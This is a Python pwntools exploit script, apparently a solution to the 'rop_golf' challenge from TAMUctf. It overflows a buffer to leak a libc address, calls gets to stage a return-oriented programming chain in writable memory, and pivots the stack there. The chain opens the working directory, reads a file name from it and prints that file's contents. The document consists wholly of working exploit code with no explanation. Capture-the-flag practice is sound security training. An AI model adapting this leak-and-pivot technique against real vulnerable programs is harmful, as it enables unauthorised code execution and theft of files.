from pwn import *

if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
    # p = remote('localhost', 7777)
    libc = ELF('./libc.so.6')
else:
    p = process('./rop_golf')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e = context.binary = ELF('./rop_golf')

pop_rsi_r15 = 0x4011f9
read_addr = 0x40114a
pop_rdi = 0x4011fb
pop_rbp = 0x40119c
writable = e.bss() + 0x200

payload = b'A'*0x28
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])
p.send(payload)
p.recvline()
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
log.info('libc: ' + hex(libc.address))

xchg_eax_esp = 0x000329e7 + libc.address
xchg_eax_edi = 0x00116dbc + libc.address
add_rax_rcx = 0x00092328 + libc.address
pop_rax = 0x0003a637 + libc.address
pop_rdx = 0x00044198 + libc.address
pop_rsi = 0x0002440e + libc.address
pop_rcx = 0x000e86fe + libc.address
log.info('writable: ' + hex(writable))

payload = b'A'*0x28
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(libc.symbols['gets'])
payload += p64(e.symbols['main'])
p.sendafter(b'hi!', payload)

chain = [ 
    u64(b'./'.ljust(8, b'\0')), 

    pop_rdi, writable,
    libc.symbols['opendir'],
    xchg_eax_edi, 
    libc.symbols['readdir'], 

    pop_rcx, 0xa3-0x40,
    add_rax_rcx, 
    xchg_eax_edi,
    pop_rsi, 0,
    pop_rdx, 0,
    libc.symbols['open'], 

    xchg_eax_edi,
    pop_rsi, writable+0x400,
    pop_rdx, 0x30, 
    libc.symbols['read'], 

    pop_rdi, 1,
    pop_rsi, writable+0x400,
    pop_rdx, 0x30,
    libc.symbols['write']
]
payload = b''
for i in chain:
    payload += p64(i)
p.sendline(payload)

payload = b'A'*0x28
payload += p64(pop_rax)
payload += p64(writable+0x8)
payload += p64(xchg_eax_esp)
p.sendlineafter(b'hi!', payload)
p.interactive()
